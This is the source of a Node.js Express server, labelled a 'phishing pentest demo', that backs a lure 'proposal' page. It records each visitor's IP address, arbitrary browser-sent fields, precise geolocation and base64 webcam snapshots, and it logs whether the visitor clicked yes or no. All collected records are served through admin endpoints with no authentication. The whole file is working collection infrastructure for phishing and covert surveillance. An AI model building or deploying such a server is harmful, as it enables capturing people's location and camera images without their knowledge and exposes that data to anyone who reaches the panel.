const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'collected_data.json');

// Ensure data file exists
if (!fs.existsSync(DATA_FILE)) {
  fs.writeFileSync(DATA_FILE, JSON.stringify([]));
}

app.use(express.json({ limit: '10mb' }));
app.use(express.text({ type: 'text/plain', limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Helper to safely parse body regardless of Content-Type (handles sendBeacon text/plain)
function parseBody(req) {
  if (!req.body) return {};
  if (typeof req.body === 'string') {
    try { return JSON.parse(req.body); } catch(e) { return {}; }
  }
  return req.body;
}

// ========== DATA COLLECTION ENDPOINTS ==========

// Collect data from the proposal page
app.post('/api/collect', (req, res) => {
  const data = parseBody(req);
  if (!data || typeof data !== 'object') {
    return res.json({ status: 'error', message: 'Invalid payload' });
  }

  const entry = {
    _server_id: Date.now().toString(36) + Math.random().toString(36).slice(2, 6),
    timestamp: new Date().toISOString(),
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress,
    ...data
  };

  // Ensure id is set (use client-provided id or fall back to server-generated)
  if (!entry.id) entry.id = entry._server_id;
  delete entry._server_id;

  try {
    const records = JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
    records.push(entry);

    // If this is a click event and has a conversion decision, update the corresponding page_visit record
    if (entry.type === 'click' && (entry.decision === 'yes' || entry.decision === 'no')) {
      const visitor = records.find(r => r.id === entry.id && r.type === 'page_visit');
      if (visitor) {
        visitor.conversion = entry.decision;
      }
    }

    fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2));
    console.log(`[+] Data collected from ${entry.ip} (type: ${entry.type}, ID: ${entry.id})`);
  } catch(e) {
    console.error('[!] Error saving collect data:', e.message);
  }

  res.json({ status: 'ok' });
});

// Collect geolocation (separate endpoint for async geo requests)
app.post('/api/geolocation', (req, res) => {
  const body = parseBody(req);
  const { id, latitude, longitude, accuracy } = body;
  if (!id) return res.json({ status: 'error', message: 'Missing id' });
  if (latitude == null || longitude == null) return res.json({ status: 'error', message: 'Missing coords' });

  try {
    const records = JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
    const record = records.find(r => r.id === id && r.type === 'page_visit');
    const timestamp = new Date().toISOString();
    
    if (record) {
      record.geolocation = { latitude: parseFloat(latitude), longitude: parseFloat(longitude), accuracy: accuracy ? parseFloat(accuracy) : null };
      record.geo_timestamp = timestamp;
      console.log(`[+] Geolocation merged into page_visit for ${id}`);
    } else {
      // Save as standalone entry — admin panel will merge client-side
      records.push({
        id,
        type: 'geolocation',
        latitude: parseFloat(latitude),
        longitude: parseFloat(longitude),
        accuracy: accuracy ? parseFloat(accuracy) : null,
        timestamp,
        ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress
      });
      console.log(`[+] Standalone Geolocation saved for ${id}`);
    }
    
    fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2));
  } catch(e) {
    console.error('[!] Error saving geolocation:', e.message);
  }

  res.json({ status: 'ok' });
});

// Collect webcam snapshot (base64)
app.post('/api/webcam', (req, res) => {
  const body = parseBody(req);
  const { id, image } = body;
  if (!id) return res.json({ status: 'error', message: 'Missing id' });
  if (!image) return res.json({ status: 'error', message: 'Missing image' });

  try {
    const records = JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
    const record = records.find(r => r.id === id && r.type === 'page_visit');
    const timestamp = new Date().toISOString();

    if (record) {
      record.webcam_image = image;
      record.webcam_timestamp = timestamp;
      console.log(`[+] Webcam image merged into page_visit for ${id}`);
    } else {
      // Save as standalone entry — admin panel will merge client-side
      records.push({
        id,
        type: 'webcam',
        image,
        timestamp,
        ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress
      });
      console.log(`[+] Standalone Webcam snapshot saved for ${id}`);
    }

    fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2));
  } catch(e) {
    console.error('[!] Error saving webcam:', e.message);
  }

  res.json({ status: 'ok' });
});

// ========== ADMIN ENDPOINTS ==========

// Get all collected data
app.get('/api/data', (req, res) => {
  const records = JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
  res.json(records);
});

// Get a single record
app.get('/api/data/:id', (req, res) => {
  const records = JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
  const record = records.find(r => r.id === req.params.id);
  if (!record) return res.status(404).json({ error: 'Not found' });
  res.json(record);
});

// Delete all data
app.delete('/api/data', (req, res) => {
  fs.writeFileSync(DATA_FILE, JSON.stringify([]));
  console.log('[!] All data cleared');
  res.json({ status: 'ok' });
});

// Serve admin panel
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Serve admin panel at /panel too
app.get('/panel', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// ========== START ==========
app.listen(PORT, '0.0.0.0', () => {
  console.log(`
  ╔══════════════════════════════════════════╗
  ║   Phishing Pentest Demo Server           ║
  ║──────────────────────────────────────────║
  ║  Proposal Site:  http://localhost:${PORT}  ║
  ║  Admin Panel:    http://localhost:${PORT}/admin  ║
  ║  Data API:       http://localhost:${PORT}/api/data ║
  ╚══════════════════════════════════════════╝
  `);
});

